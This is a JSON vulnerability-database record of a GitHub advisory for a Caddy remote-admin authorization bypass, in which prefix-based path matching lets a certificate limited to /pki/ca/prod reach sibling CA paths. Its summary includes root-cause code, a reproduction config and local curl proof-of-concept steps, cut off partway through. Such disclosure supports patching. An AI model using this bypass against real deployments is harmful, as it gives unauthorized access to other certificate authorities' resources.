@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-gx7w-56w6-g48x",
+  "aliases": [],
+  "title": "Remote Admin Authorization Bypass on PKI Endpoints via Prefix-Based Path Matching",
+  "summary": "## AI Disclosure\r\n\r\n  I used an LLM to help review the source code, reason about attack surface, and help draft and refine this report.\r\n  I manually validated the finding by reproducing it locally, confirming the vulnerable code path, and verifying the HTTP behavior with `curl -v`.\r\n\r\n  ## Summary\r\n\r\n  Caddy's remote admin access control performs path authorization using prefix matching:\r\n\r\n  - [`admin.go`](/caddy/admin.go#L719): `strings.HasPrefix(r.URL.Path, allowedPath)`\r\n\r\n  This allows a client certificate authorized only for `/pki/ca/prod` to access sibling PKI resources whose paths merely share the same prefix, such as `/pki/ca/prod-backup`.\r\n\r\n  This is an authorization bug in Caddy's source code, not a misconfiguration issue. The configured policy is more restrictive than the behavior that Caddy actually enforces.\r\n\r\n  ## Affected Component\r\n\r\n  Remote admin access control for PKI admin endpoints.\r\n\r\n  Relevant code:\r\n\r\n  - [`admin.go`](/caddy/admin.go#L687)\r\n  - [`admin.go`](/caddy/admin.go#L719)\r\n  - [`modules/caddypki/adminapi.go`](/caddy/modules/caddypki/adminapi.go#L68)\r\n  - [`modules/caddypki/adminapi.go`](/caddy/modules/caddypki/adminapi.go#L164)\r\n\r\n  ## Root Cause\r\n\r\n  In `RemoteAdmin.enforceAccessControls()`, allowed paths are checked like this:\r\n\r\n  ```go\r\n  for _, allowedPath := range accessPerm.Paths {\r\n  \tif strings.HasPrefix(r.URL.Path, allowedPath) {\r\n  \t\tpathFound = true\r\n  \t\tbreak\r\n  \t}\r\n  }\r\n```\r\n\r\n  This does not enforce a path-segment boundary.\r\n\r\n  So if the allowed path is:\r\n\r\n  /pki/ca/prod\r\n\r\n  then all of the following are treated as authorized:\r\n\r\n  - /pki/ca/prod-backup\r\n  - /pki/ca/prod1\r\n  - /pki/ca/prodanything\r\n\r\n  For PKI admin endpoints, the CA ID is taken directly from the request path:\r\n\r\n  - modules/caddypki/adminapi.go:164\r\n\r\n  So /pki/ca/prod-backup is interpreted as CA ID prod-backup, even though only /pki/ca/prod was intended to be allowed.\r\n\r\n  ## Security Impact\r\n\r\n  A remote admin client certificate restricted to one PKI CA path can access other CA resources with the same prefix.\r\n\r\n  This breaks least-privilege remote admin policies and results in authenticated authorization bypass.\r\n\r\n  ## Minimal Configuration\r\n\r\n  File: repro.json\r\n```\r\n  {\r\n    \"admin\": {\r\n      \"listen\": \"127.0.0.1:2019\",\r\n      \"identity\": {\r\n        \"identifiers\": [\"localhost\"],\r\n        \"issuers\": [\r\n          { \"module\": \"internal\" }\r\n        ]\r\n      },\r\n      \"remote\": {\r\n        \"listen\": \"127.0.0.1:2021\",\r\n        \"access_control\": [\r\n          {\r\n            \"public_keys\": [\"<CLIENT_CERT_BASE64_DER>\"],\r\n            \"permissions\": [\r\n              {\r\n                \"methods\": [\"GET\"],\r\n                \"paths\": [\"/pki/ca/prod\"]\r\n              }\r\n            ]\r\n          }\r\n        ]\r\n      }\r\n    },\r\n    \"apps\": {\r\n      \"pki\": {\r\n        \"certificate_authorities\": {\r\n          \"prod\": {\r\n            \"name\": \"prod\"\r\n          },\r\n          \"prod-backup\": {\r\n            \"name\": \"prod-backup\"\r\n          }\r\n        }\r\n      }\r\n    }\r\n  }\r\n\r\n```\r\n  ## Reproduction Steps From Scratch\r\n\r\n  ### 1. Generate a client certificate\r\n```\r\n  openssl req -x509 -newkey rsa:2048 -nodes -days 365 \\\r\n    -subj '/CN=remote-admin-client' \\\r\n    -keyout client.key \\\r\n    -out client.crt\r\n\r\n```\r\n\r\n  ### 2. Convert the client certificate to base64 DER\r\n\r\n  CLIENT_CERT_B64=\"$(openssl x509 -in client.crt -outform der | base64 | tr -d '\\n')\"\r\n\r\n  ### 3. Put that value into repro.json\r\n\r\n  Replace:\r\n\r\n  <CLIENT_CERT_BASE64_DER>\r\n\r\n  with the value of CLIENT_CERT_B64.\r\n\r\n  ### 4. Run Caddy\r\n\r\n  go run ./cmd/caddy run --config ./repro.json\r\n\r\n  ### 5. Confirm access to the intended allowed path\r\n```\r\n  curl -vk \\\r\n    --resolve localhost:2021:127.0.0.1 \\\r\n    --cert ./client.crt \\\r\n    --key ./client.key \\\r\n    https://localhost:2021/pki/ca/prod\r\n```\r\n  Expected result:\r\n\r\n  - HTTP/1.1 200 OK\r\n\r\n  ### 6. Request a different CA whose path shares the same prefix\r\n```\r\n  curl -vk \\\r\n    --resolve localhost:2021:127.0.0.1 \\...",
+  "published_at": "2026-05-13T14:40:35.000Z",
+  "modified_at": "2026-05-19T19:36:14.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 4.3,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-863"
+  ],
+  "affected": [
+    {
+      "product": "caddy",
+      "ranges": [
+        {
+          "introduced": "2.0.0",
+          "fixed": "2.11.3"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-gx7w-56w6-g48x",
+      "type": "advisory"
+    },
+    {
+      "url": "https://github.com/advisories/GHSA-gx7w-56w6-g48x",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-gx7w-56w6-g48x",
+      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-gx7w-56w6-g48x",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:2825b0f76513c5be0dd1964b163676b465f469625e4cab4b8e37019ac5c3de28",
+  "note": null
+}
